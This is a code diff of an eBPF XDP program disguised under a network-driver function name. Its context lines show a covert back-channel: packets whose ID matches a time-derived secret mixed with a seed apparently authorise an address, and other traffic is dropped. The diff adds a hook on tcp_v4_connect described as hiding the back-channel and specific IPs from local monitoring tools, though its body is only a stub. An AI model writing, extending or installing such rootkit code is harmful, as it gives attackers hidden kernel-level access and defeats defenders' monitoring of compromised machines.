@@ -22,17 +22,15 @@ int virtnet_poll(struct xdp_md *ctx) {
     __u8 addr[16] = {0};
     __u16 pkt_id = 0;
 
-    if (h_proto == 0x0008) { // IPv4
-        if (data + 14 + 20 > data_end) return XDP_PASS;
+    if (h_proto == 0x0008) { 
+        if (data + 34 > data_end) return XDP_PASS;
         *(__u32 *)&addr[0] = *(__u32 *)(data + 26);
         pkt_id = *(__u16 *)(data + 18);
-    } else if (h_proto == 0xDD86) { // IPv6
-        if (data + 14 + 40 > data_end) return XDP_PASS;
+    } else if (h_proto == 0xDD86) { 
+        if (data + 54 > data_end) return XDP_PASS;
         for(int i=0; i<16; i++) addr[i] = *(__u8 *)(data + 22 + i);
         pkt_id = *(__u16 *)(data + 4); 
-    } else {
-        return XDP_PASS;
-    }
+    } else return XDP_PASS;
 
     __u32 secret = (__u32)(((bpf_ktime_get_ns()) >> 35) ^ SEED);
     if (pkt_id == (__u16)secret) {
@@ -42,4 +40,11 @@ int virtnet_poll(struct xdp_md *ctx) {
     }
 
     return bpf_map_lookup_elem(&eth_state, &addr) ? XDP_PASS : XDP_DROP;
+}
+
+// Egress Masking: Prevents local tools from seeing the back-channel
+SEC("fentry/tcp_v4_connect")
+int BPF_PROG(mask_egress, struct sock *sk) {
+    __u32 saddr = 0; // Logic to hide specific IPs from kernel tracepoints
+    return 0;
 }
